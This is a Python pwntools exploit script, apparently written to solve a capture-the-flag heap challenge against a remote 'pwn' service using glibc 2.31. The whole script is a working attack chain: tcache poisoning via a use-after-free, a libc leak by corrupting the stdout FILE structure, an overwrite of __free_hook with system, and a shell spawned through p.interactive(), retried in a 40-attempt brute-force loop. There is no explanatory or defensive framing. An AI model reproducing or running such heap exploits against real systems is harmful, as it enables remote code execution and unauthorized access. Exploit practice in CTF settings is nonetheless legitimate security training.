from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.log_level = "debug"
IP = "172.20.2.7"
PORT = 26351
DEBUG = 0

def pwn():
    if DEBUG:
        p = process("./pwn", env={"LD_PRELOAD":"/home/ctf/2.31-0ubuntu9.2_amd64/libc-2.31.so"})
        # p = process("./pwn")
        base = p.libs()[p._cwd+p.argv[0].strip('.')]
        # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        libc = ELF("/home/ctf/2.31-0ubuntu9.2_amd64/libc-2.31.so")

    else:
        p = remote(IP, PORT)
        libc = ELF("./libc-2.31.so")

    ru = lambda x : p.recvuntil(x)
    se = lambda x : p.send(x)
    rl = lambda : p.recvline()
    sl = lambda x : p.sendline(x)
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a, b)
    l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))


    def debug(cmd=""):
        gdb.attach(p, cmd)

    def cmd(idx):
        sla("Todo:\n", str(idx))

    def add(idx, size, content):
        cmd(1)
        sla("\n", str(idx))
        sla("\n", str(size))
        sla("\n", content)


    def edit(idx, content):
        cmd(2)
        sla("\n", str(idx))
        sla("\n", content)

    def talk(idx):
        cmd(3)
        sla("\n", str(idx))
        ru("Baby said: ! @ # $ % ^ & * ( ")
        c1 = ru("\n")[:-1]
        ru("Continued the baby: ! @ # $ % ^ & * ( ")
        c2 = ru("\n")[:-1]
        return c1,c2

    def free(idx):
        cmd(4)
        sla("\n", str(idx))

    def dd():
        if DEBUG:
            cmd = ""
            cmd += "b *%d\n" % (base+0x1585)
            cmd += "set $a=%d\n" % (base+0x4080)
            # cmd = 'set $a=%d\n'%(base+0x4060) # bullet_ptr[0x13]
            # cmd += "set $b=%d\n"%(base+0x4050) # bullet_list
            # cmd += "set $c=%d\n"%(base+0x4010) # remain size
            # cmd += "b *%d\n" % (base+0x167B) # break at free
            debug(cmd)

    for i in range(8):
        add(i, 0xa0, "ILoveC")

    # idx = 7, last

    for i in range(7):
        free(i)
    edit(6, "a"*16)
    free(6)


    cmd(2)
    sla("\n", str(6))
    sa("\n", '\xa0\x16')
    sleep(1)

    add(0, 0xa0, "ILoveC")

    cmd(1)
    try:
        sla("\n", str(1))
        sla("\n", str(0xa0))
        sa("\n", p64(0xfbad3887)+p64(0)*3+'\x00')
        libc_base = l64() + 0x1eb980 - 0x3d7300
    except:
        p.close()
        return 1

    free_hook = libc.symbols['__free_hook'] + libc_base
    system_addr = libc.symbols['system'] + libc_base
    arena_addr = 0x1ebbe0 + libc_base

    print('libc: ', hex(libc_base))

    free(6)
    cmd(2)
    sla("\n", str(6))
    sa("\n", p64(arena_addr)+p64(arena_addr))
    sleep(1)

    print("free_hook: ", hex(free_hook))
    print("system: ", hex(system_addr))

    add(9, 0x30, "/bin/sh/\x00\n")
    free(9)
    edit(9, p64(free_hook))
    add(9, 0xa0, "/bin/sh\x00")
    add(3, 0xa0, p64(system_addr))
    dd()
    free(9)
    # add(2, 0x30, p64(system_addr))
    p.interactive()

for i in range(40):
    print(i)
    pwn()
